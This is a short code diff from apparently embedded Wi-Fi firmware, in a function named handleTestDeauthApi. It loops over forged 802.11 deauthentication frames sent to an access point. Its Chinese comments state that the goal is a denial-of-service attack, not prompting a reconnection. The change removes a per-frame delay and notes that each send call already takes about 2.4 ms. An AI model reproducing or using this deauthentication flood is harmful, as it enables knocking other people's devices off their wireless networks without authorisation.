@@ -136,8 +136,8 @@ void handleTestDeauthApi(HttpClient& client) {
     for (int r = 0; r < rounds; r++) {
         for (int p = 0; p < ROUND_PACKETS; p++) {
             // 伪造客户端单方向往AP发送deauth帧已经足够，目的不是尽快触发重新握手而是DoS攻击
+            // 这个调用是同步的，单次调用耗时2.4ms左右，不用额外等待
             wifi_tx_deauth_frame_ext(mac, bssid, bssid, 0x03);  // reason是客户端正常断开，但其实无所谓
-            delayMicroseconds(800);  // 等待0.8ms，无线帧完全发送出去
             // 不知道伪造的管理帧会不会触发硬件自动等待ack和重传。待调查
         }
         if (r < rounds - 1) {
